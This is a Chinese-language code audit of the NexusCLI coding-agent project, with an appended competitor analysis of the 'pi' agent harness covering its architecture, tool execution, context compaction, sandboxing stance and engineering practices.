`runtime/api.py` 1791 行单文件承载：路由表（`ROUTE_MANIFEST`）、HTTP server、SSE 帧合流、
turn/task 执行、审批桥接、静态工作台挂载。`entrypoints/repl.py`(1222) 同时管提示符、
权限控制器、31+ 斜杠命令分发、信号处理。`tools/builtins.py`(1199) 是 20 个工具的注册与实现。
**影响**：任何"改 HITL/改命令行"的联动都要在这几个文件里跨 3-5 个区域跳跃，
且它们都在 mypy 抑制名单里（与 P1-3 叠加）。**修法**：`runtime/api.py` 至少按
`routes/`（纯请求解析）+ `server/`（连接/SSE）+ `execution/`（turn/task）三段拆；
`repl.py` 把 `PermissionModeController`、`SlashDispatcher` 拆出去。

#### P2-6 `query()` 的 `history=[]` 与 `SkillContextBuffer` 策略注释需对齐

`plan_execute.py:380` 注释「Parallel plan tasks must never share one-shot Skill context」
与 `orchestrator.py:180` 共享 `self.skill_context_buffer` 的做法相反：同一次并行 team 里，
两个 worker 会**争抢同一个**一性注入缓冲（`load_skill` 的 L2 内容可能注入到错误 worker）。
**修法**：team 每个 worker 各建一个 buffer（与 plan 一致），或明确 skill 上下文只在 worker 之间
按 id 路由。

---

### 测试与文档债

**测试结构（实测）**

| 指标 | 数值 | 说明 |
|---|---|---|
| 测试文件 | 142 个 .py | 141 个测试模块 + `conftest.py`；`testpaths=["tests"]` |
| `unittest.mock` / `MagicMock` / `AsyncMock` | **0** | 全仓零 mock 框架，手写 fake + `monkeypatch`，这是明显优于同类的点 |
| 使用 `monkeypatch` | 84 文件 | 多数是环境/路径注入，不是行为替换 |
| 手写 Fake LLM | 11 文件 | `FakeLlm/ScriptedLlm` + `httpx.MockTransport` 12 文件 |
| pty 真实终端 | **4 文件** | `test_approval_keys` / `test_plain_exits` / `test_skill_propose_pty` / `test_slash_completion` |
| `skipif/xfail` | 16 处 | 主要在 win32 / rg / pty 可用性 |
| 网络冒烟 | 仅 eval real 轨 | 需真实网关；`AGENTS.md` 明确沙箱内不可跑 |

**盲区（按风险排序）**

1. **并发与恢复的组合路径**：`orchestrator` 并行 worker 的 history 竞态（P1-2）无测试；
   `plan` checkpoint 恢复 × journal 缺失（P1-7）无测试。`test_plan_checkpoint.py`(416 行) 测的是
   续跑流程，但不覆盖"任务重放产生重复副作用"。
2. **slash 注入的安全语义**：`test_slash_commands.py:199-205` 只断言 stdout 替换成功与
   `rejected_injections==()`；没有"危险命令必须被拒/必须走审批"的用例（因为实现里没有审批）。
3. **MCP 注解信任**：`test_mcp.py`(128 行)/`test_mcp_filter.py` 覆盖过滤与协议，
   没有"server 谎报 readOnlyHint 时仍须审批/plan 模式须拒绝"的用例。
4. **真实终端不可复现**：`tests/` 里 4 个 pty 文件之外，testing-matrix 的"真人模拟"列共 100+ 行
   依赖 `.spec/.../evidence/` 一次性产物；没有 `@pytest.mark.pty` / `@pytest.mark.real_gateway`
   的 marker 声明与专门的本地入口（`pyproject.toml:54-56` 只有 testpaths/addopts）。
   **修法**：加 marker + `scripts/smoke_terminal.py`（pty + CPR 应答，复用 AGENTS.md 的约定），
   让"真实终端一次过"变成一条可重复命令。
5. **mypy / ruff 门禁本身无测试**：清单增长、`site/` 被排除都无人拦（P1-3/P1-4）。
   **修法**：`scripts/check_type_baseline.py` + 在 CI 里对 ruff 的 `extend-exclude` 做断言。

**文档债**

- `docs/testing-matrix.md` 的时间戳与表面数过期（P2-4）。
- `docs/permissions.md:93-101` 对 slash 注入的描述只到"env 未清洗"，未提"无审批/无审计"（与 P0-1 相关）。
- `.spec/specs/archive/*/completion-summary.md` 的「遗留事项」结构性写"无"，与正文"挂账"并存，
  读者无法据此判断真实待办。
- `docs/tools.md` / README 未说明"`!`cmd`` 注入在项目级命令里默认执行"这一行为边界。

---

### 与竞品能力缺口

只列代码里**确实没有**或明确挂账的（不评价竞品优劣）：

| 缺口 | 依据 | 说明 |
|---|---|---|
| OS 级沙箱 / 容器执行 | `policy/sandbox.py:1-25`（自述"blocklist，不是能力系统"）；`docs/permissions.md` OS 沙箱"挂账" | 只有 env 清洗 + 进程组 kill；无 seccomp/容器/受限令牌/网络命名空间 |
| 真实 LSP / 诊断协议 | `lsp/diagnostics.py:1-15`（`py_compile`） | 无 JSON-RPC、无 publishDiagnostics、无跨文件符号；写了文件才自检 `.py` |
| IDE / 编辑器集成 | 全仓无 VS Code / JetBrains / ACP 入口（`frontend/` 是浏览器工作台） | 只有终端 + 本地 HTTP 工作台 |
| daemon / 远程执行 | `runtime/api.py:313` 打印 `http://127.0.0.1:<port>`；`--api-key` 单键 | 单机单用户，无 TLS、无多用户/租户、无远程 worker 池 |
| 插件市场 / 远程分发 | `plugins/loader.py:3-14`「no user-level plugin directory and no remote/marketplace」 | 只有 `<cwd>/.nexuscli/plugins/<name>` 本地目录 |
| hooks 生态 | `hooks/` 七个事件、`docs/hooks.md` | 无第三方 hook 注册表/共享仓库，只能手写本地命令 |
| MCP server 注册与发现 | `mcp/config.py`（用户显式配置 `mcp.json`） | 无官方/社区目录、无 one-click 安装、无 capability 协商 UI |
| 多用户 / 企业治理 | 单 `NEXUSCLI_RUNTIME_API_KEY`、审计为单文件 JSONL（`config.py:99`） | 无 RBAC、无审计轮转/导出/保留策略、无 SSO |
| git 级 checkpoint/rewind | `snapshot/service.py` 是目录级复制；`agent/turn_checkpoint.py` 是消息级 | 恢复粒度粗（整树/整回合），无 `git stash` 式单文件回滚（有 `vfs` 只读视图） |
| 浏览器/移动端远程审批 | `runtime/approvals.py` 已支持 Web 审批（300s 超时、五态） | 仅本机 HTTP，缺"人在外面用手机点一下"的远程通道（需 daemon+公网方案，非缺陷） |

**仍算优势、别在对比中漏掉的**：五键位审批（approve/approve_run/deny/skip/auto）、
deny>ask>allow 规则、run-scope 授权的精确审计归因、工具副作用 journal、turn checkpoint、
SSE + bootstrap/CSRF 双通道鉴权、真实模型消融 eval 轨——这些在代码里是**真实接线**的
（`tools/executor.py:270-330`、`runtime/approvals.py:1-100`、`runtime/api.py:439-450`），
不是 README 话术。

---

### 附：本次审计的可复现命令

```bash
# lint / format（仓库根失败，src 通过）
.venv/bin/python -m ruff check .        # → 2 errors, site/build.py:29,45
.venv/bin/python -m ruff check src/     # → All checks passed
.venv/bin/python -m ruff format --check .  # → 1 file would be reformatted

# 启动开销（macOS，冷启动）
/usr/bin/time -p .venv/bin/python -c "import nexuscli.entrypoints.cli"   # real 0.43-0.44s

# 路径分叉
grep -n 'LoopGuard\|compact_now\|force_trim\|hit_limit' src/nexuscli/agent/query.py   # 无命中
diff <(sed -n '695,800p' src/nexuscli/agent/agent.py) <(sed -n '184,281p' src/nexuscli/agent/query.py)

# mypy 覆盖（需联网，本次未复算错误数）
.venv/bin/python - <<'PY'  # 解析 pyproject 统计：30 模块 / 15,289 行 / 46%
PY
```

**审计限制（如实声明）**：① 未跑全量 pytest（由 Lead 执行），故未给出失败用例清单；
② 本机 `.venv` 无 mypy、`uv run --with mypy` 需联网，故未复算 30 个模块的实际错误数，
只核对了排除清单的覆盖范围；③ 未联网，未做真实网关/真实 MCP server 对接验证——
MCP `readOnlyHint` 与 slash 注入两条 P0 是**静态代码路径**结论，建议修复后补两条端到端回归。

# 附录 B：pi 竞品分析底稿（原文）

## pi（earendil-works/pi）竞品分析

> 分析对象：`earendil-works/pi`（原 `badlogic/pi-mono`），本地只读克隆 `/tmp/nexus-research/pi`，提交
> `085c84e`（2026-11-07）。star 约 12.06 万（GitHub 页面 `stargazerCount=120600`，抓取时间 2026-11-07）。
> npm 周下载（2026-10-31 ~ 11-06）：`@earendil-works/pi-coding-agent` 606 万、`pi-ai` 1090 万、`pi-tui` 892 万
> （`api.npmjs.org/downloads/point/last-week/*` 实查；反映被其他 agent 项目复用，不等于 CLI 用户数）。
> 对照对象：NexusCLI（本仓库，33,338 行 Python，六项运行期依赖 `pyproject.toml:9-16`）。
>
> 方法与限制：本地浅克隆（depth=1，无 git 历史，故不做提交/贡献者统计）；**未安装依赖、未运行 pi**
> （只读，无 `node_modules`），因此本文所有行为结论来自源码、官方文档与 README，而非运行时实测。
> 行数用 `find … -name '*.ts' | xargs wc -l` 统计；官方 URL 已于 2026-11-07 逐一验证可访问（HTTP 200）。

---

### 0. 结论先行（TL;DR）

1. **pi 不是"功能更全的 Claude Code"，而是"故意做小的 agent harness + 一套可独立复用的底层库"。** 它自己
   把子代理、plan mode、权限系统都划到核心之外（`README.md:19`、`README.md:88-90`），换来的是一套
   进程内 TypeScript 扩展 API（`packages/coding-agent/docs/extensions.md`，3367 行文档）+ npm/git 分发的
   "Pi packages"。
2. **真正的差异化只有两处，而且是机制级的**：`pi-ai` 的 provider 统一抽象（34 个具名 provider，目录共 35 项——最后一项是"任意
   OpenAI-compatible 端点"，`packages/ai/README.md:62-100`）与 `pi-codemode`（QuickJS-WASM 沙箱里跑模型写的
   JS，**嵌套工具调用不进 LLM 上下文**，`packages/codemode/README.md:3-5`）。
3. **安全模型是"边界外移"**：内置零权限、零沙箱、无审批（`packages/coding-agent/docs/security.md:3-5`，
   `SECURITY.md` 把"本地代码执行/沙箱"列为 out of scope）。项目信任（project trust）只保护**资源加载**，
   不保护**工具执行**。
4. **工程成熟度是同量级里的顶级**：57 万行 TS 中约 54% 是测试（源码 23.9 万 / 测试 31.2 万行），
   `npm run check` 串了 9 个步骤（biome + 6 个结构脚本 + 2 次 `tsc --noEmit` + 浏览器冒烟，`package.json` scripts），291 个已发布版本（另 1 个 Unreleased 段），42 篇文档 + 把文档本身
   做 A/B 评测（`packages/evals/README.md:7-10`），供应链按"依赖变更=代码评审"处理（`README.md:168-180`）。
5. **代价是重心分散**：12 个包里 `chord`+`durable`+`env` 合计 9.3 万行源码（占全部源码 39%），服务的却是
   一个官方标注 "will be gone soon" 的实验性 Web 应用 `apps/p2`（`apps/p2/README.md:3-8`）；CLI 本体
   `coding-agent/src` 只有 7.86 万行。

---

### 1. pi 是什么、为谁做

**定位（原文）**："Pi is a minimal, extensible agent harness that you can make your own."（`README.md:15`）
"Adapt Pi to your workflows, not the other way around."（`README.md:17`）

**目标用户**：愿意自己写扩展、并且能审计第三方扩展源码的高级个人开发者与小团队。证据：

- 定制四件套被写成第一等公民：extensions / skills / prompt templates / themes（`README.md:17`），
  可打包成 Pi package 走 npm 或 git 分享（`packages/coding-agent/docs/packages.md:1-30`）。
- 明确建议"审查扩展和包源码后再加载"（`packages/coding-agent/docs/security.md`，"Reduce impact" 一节）。
- 真实集成案例点名 [OpenClaw](https://github.com/OpenClaw/OpenClaw)（`README.md:21`）。
- 分发覆盖五条路径：curl 安装器（pin 全部依赖）、`npm install -g`、Nix flake、GitHub Release 的 Bun 单文件
  二进制、源码（`README.md:25-70`、`README.md:155-166`）；运行接口五种：交互 TUI / `--print` / JSON 事件流 /
  RPC / TypeScript SDK（`README.md:21`、`packages/coding-agent/docs/cli.md:22-40`）。

**相对 Claude Code / Codex CLI 的差异**（结论，非宣传语）：

| 维度 | pi | Claude Code / Codex CLI（公开形态） |
|---|---|---|
| 产品哲学 | 核心最小 + 一切皆扩展；自己不支持的能力让你写/装 | 内置完整产品面（权限、子代理、plan、hooks） |
| 扩展边界 | 扩展是**进程内 TypeScript 模块**，可注册工具/命令/快捷键/provider/MCP server/渲染器/整套 UI | hooks 与 MCP 为主，不能替换 TUI 与 provider |
| 权限 | **没有**内置权限系统；靠容器/微 VM + 项目信任 | 逐次审批、沙箱、permission rules |
| 上下文工程 | JSONL 会话树 + 结构化压缩 + 分支摘要 + prompt cache 预热 | 压缩 + 会话恢复，树形分支较弱 |
| 批量工具调用 | codemode：模型写一段 JS 在 QuickJS 沙箱里编排工具，中间结果不进上下文 | 逐步工具调用为主 |
| 可嵌入性 | 一等公民：SDK / RPC / JSON / 单二进制 | 以 CLI 为主 |

**版本与节奏**：当前 `1.5.0`（2026-11-02），`packages/coding-agent/CHANGELOG.md` 里共 292 个 `## [` 段
（291 个已发布版本 + 1 个 Unreleased）；
近六个 minor 是 10-05 → 10-07 → 10-12 → 10-15 → 10-21 → 11-02，**约每周到两周一个 minor**。每个 PR 都会
打包 preview 包（`.github/workflows/ci.yml:26-43`），tag 触发跨平台二进制构建
（`.github/workflows/build-binaries.yml`）。

---

### 2. 架构拆解

#### 2.1 包职责与体量（实测行数）

| 包 | 源码行 | 测试行 | 职责（一句话） | 证据 |
|---|---:|---:|---|---|
| `coding-agent` | 78,561 | 78,992 | 交互式 CLI：会话、工具、扩展宿主、压缩、四种运行模式 | `packages/coding-agent/README.md` |
| `ai` | 28,868 | 49,503 | 统一多 provider LLM API + 模型目录 + OAuth + 工具调用/推理/图像 | `packages/ai/README.md:1-100` |
| `agent` | 2,555 | 4,206 | 无 UI 的 agent loop：事件流、工具批处理、状态管理 | `packages/agent/README.md:1-30` |
| `tui` | 19,971 | 21,107 | 差分渲染终端 UI 框架（主屏/备用屏、CSI 2026、内联图片） | `packages/tui/README.md:1-16` |
| `chord` | 56,282 | 86,721 | 跨进程对象运行时：契约、文档、store、插件热重载、HTTP/worker/终端/Web 表面 | `packages/chord/README.md:3-12` |
| `durable` | 34,097 | 58,181 | 持久化 agent 运行时：会话/任务/文档先落盘再外显，崩溃可续 | `packages/durable/README.md:3-8` |
| `codemode` | 3,049 | 2,157 | QuickJS-WASM 代码沙箱（Node worker / Cloudflare DO / 内联三种） | `packages/codemode/README.md:1-20` |
| `mcp` | 4,746 | 3,367 | MCP 客户端/工具桥（stdio + streamable HTTP、OAuth） | `packages/mcp/README.md` |
| `env` | 2,571 | 1,924 | 远程执行环境：Rust daemon over SSH，供 durable 用 | `packages/env/README.md:1-8` |
| `evals` | 1,447 | 830 | 行为评测：Docker 隔离的 with/without docs 对照、host smoke | `packages/evals/README.md` |
| `schema` | 4,852 | 3,949 | JSON Schema 构建器/校验 | `packages/schema/README.md` |
| `telemetry` | 1,630 | 1,073 | 厂商中立的 telemetry 契约 + 参考适配器 + 一致性测试 | `packages/telemetry/README.md` |
| **合计** | **238,629** | **312,010** | 另有 `apps/p2`（实验 Web UI）与 scripts/examples | 本仓库 `find+wc` |

> 注意比例：**测试 ≈ 源码的 1.31 倍**；`chord`/`durable` 的测试量（14.5 万行）超过 `coding-agent` 全部源码。

#### 2.2 依赖方向（`package.json` 实测，非推断）

```
schema ──► ai ──► agent ──► coding-agent
   │        │                 ▲  ▲  ▲
   │        └──► durable      │  │  └── tui（无内部依赖）
   └──► chord ──► durable ──► env
            │        │
            └────────┴──► apps/p2（实验）
telemetry ──► ai, chord, durable
mcp / codemode / tui：无内部依赖（可单独发布复用）
```

要点：**存在两个几乎不相交的簇**。

- 簇 A（CLI 产品）：`ai → agent → coding-agent`，加上 `tui`、`mcp`、`codemode`。
- 簇 B（服务端/持久化平台）：`chord → durable → env → apps/p2`，只复用 `ai`、`schema`、`telemetry`。
- 簇 B 占源码 39%，但**不被 `coding-agent` 依赖**（`packages/coding-agent/package.json:43-50` 只列
  agent/ai/codemode/mcp/tui）。这是理解 pi"为什么拆这么多包"的关键：作者在同时做一个**可持久化的 agent
  应用运行时**，CLI 只是它的一个客户端形态。

#### 2.3 扩展点（四层，边界逐层变宽）

| 层 | 机制 | 能做什么 | 不能做什么 | 证据 |
|---|---|---|---|---|
| Skill | 目录 + `SKILL.md`（Agent Skills 规范），启动只注入 name/description/path，按需读全文 | 给模型领域指令 + 附带脚本/资源；`disable-model-invocation` 可隐藏 | 不能执行代码、不能改 UI | `docs/skills.md:1-40`、`docs/skills.md:55-60` |
| Prompt template | Markdown 模板，编辑器输入展开 | 复用提示词 | 同上 | `docs/prompt-templates.md` |
| Extension | 进程内 TS 模块（jiti 运行时加载，无需构建） | 注册 tool/command/shortcut/flag、订阅全套生命周期事件、注册 provider/MCP server、替换渲染器与编辑器、自定义 overlay | 无 capability 边界；与 pi 同权限 | `docs/extensions.md:68-120`、`:307-412`、`:1567-2140`、`:1974` |
| Pi package | npm/git/本地目录，聚合 extensions+skills+prompts+themes | 分发与版本钉住 | 安装需项目信任 | `docs/packages.md:1-60` |

扩展 API 的组织方式值得单独看：`pi.on(event, handler)` 覆盖生命周期（startup/resource/session/agent/model/
tool/user-bash/input 八组，`docs/extensions.md:307-1163`），`ExtensionContext` 暴露 `ctx.ui`、`ctx.compact()`、
`ctx.newSession()/fork()/navigateTree()/switchSession()`（`:1163-1512`），`pi.registerTool` 允许**同名覆盖内置
工具**（`:2358-2391`）。这是"agent harness 而不是 agent 产品"的最直接体现。

另一个关键设计：**内建工具本身也是可替换实现的工厂函数**（`createReadTool` / `createBashTool` 等导出
operations 接口，`packages/coding-agent/src/core/tools/index.ts`），所以 `ssh.ts`、`gondolin/`、`interactive-shell.ts`
这类示例能把工具执行搬到远端/微 VM，而不改核心（`docs/extensions.md:3273-3367` 示例表）。

---

### 3. 关键机制

#### 3.1 Agent loop（`packages/agent/src/agent-loop.ts`）

- 输入输出都是 `AgentMessage`，只在 LLM 调用边界经 `convertToLlm()` 转成 provider 消息
  （`agent-loop.ts:1-5`、`packages/agent/README.md:40-58`）；`transformContext()` 是可选的上下文改写点。
- 事件序列固定：`agent_start → turn_start → message_start/update/end → tool_execution_start/update/end →
  turn_end → agent_end`（`packages/agent/README.md:60-105`）。
- 工具批处理：默认 `parallel`——**先顺序做前置检查，再并发执行**，`tool_execution_end` 按完成顺序发，
  但持久化的 toolResult 消息与 `turn_end.toolResults` 仍按 assistant 源顺序（`README.md:112-121`）。
  单个工具可声明 `executionMode: "sequential"`，任一命中则整批串行。
- `beforeToolCall` / `afterToolCall` 两个钩子是唯一的执行拦截点，可返回 `terminate: true`；只有**整批**结果
  都 terminate 才提前结束循环（`README.md:123-129`）。coding-agent 把扩展的 `tool_call` / `tool_result` 事件
  接到这两个钩子上（`packages/coding-agent/src/core/agent-session.ts:705-760`）。

#### 3.2 工具执行与审批：**没有审批**

- 内置工具只有 8 个：read / write / edit / bash / powershell / grep / find / ls
  （`packages/coding-agent/src/core/tools/index.ts` 导出）；codemode、MCP、tool-search 以扩展形式内建
  （`src/extensions/{codemode,mcp,tool-search}`）。
- **不存在 approval / requiresApproval / HITL 实现**：在 `packages/coding-agent/src` 全量 `grep -rn 'approval'` 只命中
  llama 扩展里的 HuggingFace 访问条款提示。官方态度明确："it does not ask for approval before every tool call"
  （`docs/security.md:3`），"Pi does not include a built-in permission system for restricting filesystem, process,
  network, or credential access"（`README.md:88-96`）。
- 需要审批时，做法是**装一个扩展**：官方示例 `examples/extensions/permission-gate.ts`（`on("tool_call")` +
  `ui.select`）、`protected-paths.ts`、`confirm-destructive.ts`（`docs/extensions.md:3300`）。
- 工程上做得好的两点：① 工具结果有统一截断与守卫（`src/core/output-guard.ts`、`truncateHead` 示例），避免
  单次工具输出炸上下文；② 写文件走 `withFileMutationQueue` 串行化（`src/core/tools/file-mutation-queue.ts`）。

#### 3.3 上下文压缩（`packages/coding-agent/docs/compaction.md`）

两套机制并存：

| 机制 | 触发 | 产物 |
|---|---|---|
| Compaction | `contextTokens > contextWindow - reserveTokens`（默认 16384）或 `/compact` | `CompactionEntry`（摘要 + `firstKeptEntryId`） |
| Branch summarization | `/tree` 切分支 | `BranchSummaryEntry` |

- 触发点很讲究：工具批次结束、下一轮 assistant 之前，在 `prepareNextTurn` 里压缩；此外在新 user prompt 前
  检查，并在 provider 报 context-overflow 或 `stopReason: "length"` 时做**一次** compact-and-retry
  （`compaction.md:27-42`、`:85-99`）。
- 切割策略：从尾部回溯累计 token 到 `keepRecentTokens`（默认 20k）确定切点（`:43-50`）。
- 摘要格式是结构化的：Goal / Constraints & Preferences / Progress(Done/In Progress/Blocked) / Key Decisions /
  Next Steps / Critical Context（`:234-275`）——比"总结一下上文"稳定得多。
- 文件操作跨压缩**累计跟踪**（`:200-206`），避免压缩后丢失"改过哪些文件"。
- 摘要请求**关闭 prompt cache 写入**（`:23`），因为一次性请求不值得写缓存。
- 扩展可在 `session_before_compact` / `session_before_tree` 替换摘要逻辑（`:293-416`）。

#### 3.4 会话持久化（`docs/how-pi-works.md:22-28`、`docs/session-format.md`、`docs/sessions.md`）

- 会话是 **JSONL 文件**，每条 entry 有 id 并指向 parent；**当前 entry 决定活动分支**——即会话本身是一棵树，
  不是线性列表。
- 三种"离开当前路径"的语义被明确区分：`/tree` 在同一文件内移动、`/fork` 从历史 user message 新建会话、
  `/clone` 复制活动分支（`docs/sessions.md:30-40`）。继续历史对话会在同一文件里长出分支。
- 模型与 thinking level 的变更也记进会话，恢复会话时还原（`docs/models.md:35`）。
- 压缩不删原始 entry，只在后续请求里用 summary 替换旧消息（`how-pi-works.md:35-36`）。

#### 3.5 模型抽象（`packages/ai`）

- **34 个具名 provider**（`packages/ai/README.md:62-100`，另加"任意 OpenAI-compatible 端点"一项）；每个 provider 有独立
  的 `*.models.ts` 目录文件与 API 实现（`src/providers/`，97 个 .ts）。
- 认证顺序明确：运行时 `--api-key` > `auth.json` > `models.json` 的 apiKey > 环境变量/云凭据
  （`docs/models.md:23`）；支持 OAuth（GitHub Copilot、OpenAI Codex、Vertex 等）。
- 统一了这些容易做歪的横切面：thinking/推理级别、图像输入与生成、工具参数校验、constrained sampling、
  stop reason、usage/成本、abort 与"abort 后继续"、跨 provider handoff、请求头改写
  （`packages/ai/README.md` 目录结构）。
- 测试用 `faux` provider（`src/providers/faux.ts`）与 `packages/coding-agent/test/suite/harness.ts` 组合，
  保证 CI 不碰真 key（`test/suite/README.md:1-8`）。
- 模型目录是**数据**而非代码：`models.generated.ts` 由 `packages/ai/catalog/` 生成，`AGENTS.md:29` 明令禁止手改；
  Nix 构建用 `nix/model-catalog.json` 钉住 catalog 版本（`README.md:66`）。

#### 3.6 TUI（`packages/tui`）

- 卖点是 **differential rendering + synchronized output（CSI 2026）**：只重绘变化行/视口行，原子提交避免闪烁
  （`packages/tui/README.md:1-16`）。
- 两套渲染器共享一个 `TUI` 接口：`TuiMainScreen`（保留终端 scrollback）与 `TuiAltScreen`（固定视口、应用自管
  滚动，退出时打印完整文档）（`README.md:57-80`）。
- 组件面覆盖到"能自己写一个 Claude Code"：Markdown、Editor（IME 支持）、SelectList、SettingsList、Overlay、
  MouseRegion、Kitty/iTerm2 内联图片（`README.md:5-16`、`:364-692`）。
- 性能工程有痕迹：启动分阶段计时（`src/core/timings.ts:1-4`，`PI_TIMING=1`）、`profile:tui` / `profile:rpc`
  脚本（根 `package.json` scripts）、输出守卫接管 stdout（`src/core/output-guard.ts`）。

#### 3.7 沙箱与安全：把边界交给操作系统/容器

- 官方立场：Pi 跑在**启动它的用户的安全边界内**；本地写权限≈Pi 权限；提示注入"无法防"
  （`SECURITY.md:3-24`、`:48-50`）；"Local code execution or sandboxing behavior (the Pi coding agent intentionally
  does not have a sandbox)" 列为 out of scope。
- 项目信任（project trust）**只管资源加载**：`.pi/settings.json`、`.pi/mcp.json`、`.pi/extensions|skills|prompts|
  themes`、`.pi/SYSTEM.md`、`.agents/skills` 需要显式信任（`docs/security.md:35-57`）。默认 `defaultProjectTrust:
  "ask"`，决定存 `~/.pi/agent/trust.json`（`:59-72`）。
- 文档自己披露了两个边界事实：① 项目 `sessionDir` 在**解析信任之前**就被读取；② 信任不能阻止 `AGENTS.md`
  之类上下文文件影响模型（`docs/security.md:31-36`、`:57`）。
- 三种隔离方案（`docs/containerization.md`）：整进程 Docker / Docker Sandboxes / OpenShell 策略沙箱；以及
  **Gondolin 扩展**——pi 与凭据留在宿主，只把内置工具与 `!` 命令路由进本地 Linux micro-VM（`README.md:88-96`）。
- 结论：pi 的"安全"是**部署形态问题**，不是代码问题。这与 NexusCLI 的"代码内 HITL + PathGuard + CommandGuard +
  审计"是两种不相交的路线。

#### 3.8 两个差异化能力

**codemode（`packages/codemode`，3,049 行）**

- 模型写一段 async JS，在 QuickJS（编译成 WebAssembly）里跑；VM 的**唯一能力是调用注入的工具**，没有
  timers/fetch/process/require/module（`packages/codemode/README.md:3-10`、`:56`）。
- 核心收益：**嵌套工具调用的输入输出不进入 LLM 上下文**，只有脚本的 `text()` 输出与返回值进上下文——这是
  比"多轮 tool call"更省 token 的批处理范式，也顺带把"多次调用"变成一个可复现脚本。
- 三种沙箱同 API：Node worker thread（`CodemodeSandbox`）、Cloudflare Durable Object（`RemoteCodemodeSandbox`）、
  调用线程内联（`InlineCodemodeSandbox`）；Cloudflare 那张"10 秒计算阻塞其它请求 vs 独立 Worker 约 50ms"的
  实测表说明作者真的在 serverless 上跑过（`README.md` "Why a separate Worker" 节）。
- 还有确定性重放 `sandbox.start()`（固定时间/随机/UTC/结果顺序），用于崩溃后续跑。
- 在 coding-agent 里它是内置扩展 `codemode`（`src/extensions/codemode`），默认 worker 上限 2，可
  `PI_CODEMODE_MAX_WORKERS` 调整（`packages/coding-agent/CHANGELOG.md:177`、`:207`）。

**chord / durable（`packages/chord` + `packages/durable`，9 万行源码）**

- chord 是"跨进程对象运行时"：契约（JSON Schema 描述的 name/params/members/version）、facet 插件、引用
  （reference 而非对象）、文档事务、作业、principal、**插件热重载且数据/连接/在途工作尽量存活**
  （`packages/chord/README.md:3-12`）。文档工程量惊人：design.md + decisions.md + slices.md + 分层 README +
  按主题编号的可运行 examples。
- durable 是"先落盘再外显"的 agent 运行时：进程死在 turn 中间，重开存储能续跑；死在同一模型请求上算一次
  失败尝试并重试（`packages/durable/README.md:3-6`，标注 **Experimental**）。它内置 codemode、压缩、hooks，
  甚至给了**前台/后台子代理**的完整配方（`README.md:725-770`，`test/examples/21/22-*.ts`）。
- 现状：只被 `apps/p2`（自托管 Web UI，标注 "p2 is a prototype. It will be gone soon."、
  `apps/p2/README.md:3-8`）使用。也就是说 **pi 最"未来感"的两块能力，目前没有产品化出口**。

---

### 4. 工程质量

| 维度 | 事实 | 证据 |
|---|---|---|
| 测试规模 | 978 个 `*.test.ts`；coding-agent 353 个；src:test ≈ 1:1.31 | `find` 统计 |
| 测试基建 | `test/suite/` 用 `harness.ts` + faux provider，禁止真 key；`test.sh` 用 `env -i` 隔离 HOME/USERPROFILE/TMPDIR/GIT/NPM 配置并设 `PI_NO_LOCAL_LLM=1` | `test/suite/README.md:1-8`、`test.sh:1-84` |
| 类型与静态检查 | `npm run check` = biome + pinned-deps + runtime-deps + ts 相对导入 + entry-graph + install-lock + `tsc --noEmit`×2 + browser-smoke | 根 `package.json` scripts |
| 代码规则 | 禁 `any`、禁内联 import、只用可擦除 TS 语法（Node strip-only）、单 call-site helper 内联、生成文件禁手改 | `AGENTS.md:15-30` |
| CI | 三路并行测试（coding-agent / durable / other）；CI 装 `npm ci --ignore-scripts`；PR 产物打成 preview 包 | `.github/workflows/ci.yml:11-56` |
| 发布 | 291 个已发布版本段 + Unreleased 段；每周~两周 minor；每包独立 CHANGELOG + Unreleased 分段规则 | `packages/*/CHANGELOG.md`、`AGENTS.md:123-139` |
| 文档 | coding-agent 下 42 篇 `.md`；站点 pi.dev/docs/latest；RFC 公开在 rfc.earendil.com/keyword/pi | `packages/coding-agent/docs/` |
| 文档质量闭环 | `packages/evals` 做 with_docs / without_docs **双镜像对照**，量"文档对 agent 任务通过率的提升"；另有 `eval:audit` 全站扫描文档 | `packages/evals/README.md:7-10`、`:30`、`:45-100` |
| 供应链 | 直接依赖精确版本、`save-exact` + `min-release-age=2`、install-lock 钉传递依赖、禁 lifecycle script、定时 `npm audit` + 签名校验 | `README.md:168-180`、`AGENTS.md:60-67` |
| 可观测 | 独立 `telemetry` 包（契约 + 参考适配器 + 一致性测试）；coding-agent 有 trace/usage/cost、prompt cache 统计与**缓存预热**（预期节省 ≥$0.05 才发） | `packages/telemetry/README.md`、`src/core/cache-warmer.ts:12-25` |
| 贡献治理 | 新贡献者 issue/PR 默认自动关闭，靠 `lgtm`/`lgtmi` 白名单放行；"必须理解自己的代码" | `CONTRIBUTING.md:3-40`、`.github/workflows/approve-contributor.yml` |

**明显短板（工程向）**

1. **评测不进 CI**：`packages/evals` 需要 `PI_PROVIDER` + `PI_MODEL` 与真实计费，`ci.yml` 里没有任何 eval
   job（`grep eval .github/workflows/ci.yml` 无命中）。行为回归靠 978 个测试文件，端到端行为只在人工/夜跑。
   对比 NexusCLI 把 hermetic eval 当 CI 门禁（`docs/eval.md:1-10`）。
2. **包多、重心散**：12 包中 3 包服务一个"将被替换"的 p2；`durable` 自己标 Experimental。架构叙事漂亮，
   但用户能用到的那条链路只占 1/3 代码。
3. **无性能预算**：有 `PI_TIMING` 与 profile 脚本，但仓库里没有"启动时间不得超过 X ms"之类的门禁文档。
4. **文档与实现同步靠人**：`AGENTS.md:125-133` 定规则、docs-lift eval 只覆盖 coding-agent 部分文档。
5. **Windows/终端矩阵成本高**：依赖 tmux/pty 的交互测试、Bun 在 Windows 的 `terminate()` 语义、PowerShell
   独立工具——跨平台是真实成本（`packages/codemode/README.md` 运行时注记、`pi-test.ps1`）。

---

### 5. 与 NexusCLI 能力矩阵

> pi 侧证据为仓库路径；NexusCLI 侧证据为本仓库 `file:line`。判定列是"对 NexusCLI 的含义"。

| # | 能力 | pi | NexusCLI | 判定 |
|---|---|---|---|---|
| 1 | 模型接入 | 34 个具名 provider + 任意 OpenAI-compatible + OAuth + 虚拟模型 + 跨 provider handoff（`packages/ai/README.md:62-100`、`docs/extensions.md:2115`） | `anthropic` 原生 + OpenAI-compatible 家族（deepseek/openai/glm/zhipu/kimi/moonshot/step）与 BYOK 选择器（`llm/factory.py:11-24`、`:120`） | pi 宽度碾压；NexusCLI 薄抽象更省维护，差距主要在 OAuth 订阅类 provider 与本地模型 |
